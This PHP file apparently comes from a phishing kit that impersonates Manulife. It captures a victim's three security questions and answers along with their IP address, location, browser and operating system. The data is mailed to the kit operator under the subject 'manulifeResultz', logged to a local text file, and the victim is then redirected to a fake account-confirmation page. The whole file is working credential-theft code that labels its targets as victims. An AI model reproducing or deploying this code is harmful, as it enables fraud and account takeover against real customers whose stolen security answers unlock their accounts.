<?php
require "../../../CONTROLS.php";
require "../includes/session_protect.php";
require "../includes/functions.php";
require "../includes/One_Time.php";
ini_set('display_errors', 0);


        $date = date('l d F Y');
        $time = date('H:i');
        $Q1 = $_POST['Q1'];
		$A1 = $_POST['A1'];
        $Q2 = $_POST['Q2'];
		$A2 = $_POST['A2'];
		$Q3 = $_POST['Q3'];
		$A3 = $_POST['A3'];
        $ip = $_SERVER['REMOTE_ADDR'];
        $systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);
        $VictimInfo1 = "IP 			: " . $_SERVER['REMOTE_ADDR'] . " (" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . ")";
        $VictimInfo2 = "LOCATION	: " . $systemInfo['city'] . ", " . $systemInfo['region'] . ", " . $systemInfo['country'] . "";
        $VictimInfo3 = "USERAGENT	: " . $systemInfo['useragent'] . "";
        $VictimInfo4 = "BROWSER		: " . $systemInfo['browser'] . "";
        $VictimInfo5 = "OS			: " . $systemInfo['os'] . "";
        $data = "
+ ------------- 2 QuestionDetails --------------+
| Q1		: $Q1
| A1		: $A1
| Q2	 	: $Q2
| A2 		: $A2
| Q3	 	: $Q3
| A3	 	: $A3
+ -------created by medpage[679849675]----------+
+ Victim Information
$VictimInfo1
$VictimInfo2
$VictimInfo3
$VictimInfo4
$VictimInfo5
| Received : $date @ $time
+ ----------------------------------------------+
";


        $subject = "manulifeResultz 2 " . $systemInfo['country'];
        mail($receiverAddress, $subject, $data);

$fp = fopen('../../../manulifeResultz.txt', 'a');
fwrite($fp, $data);
fclose($fp);
?>
<script type="text/javascript">
    window.top.location.href = "accountConfirm.php";

</script>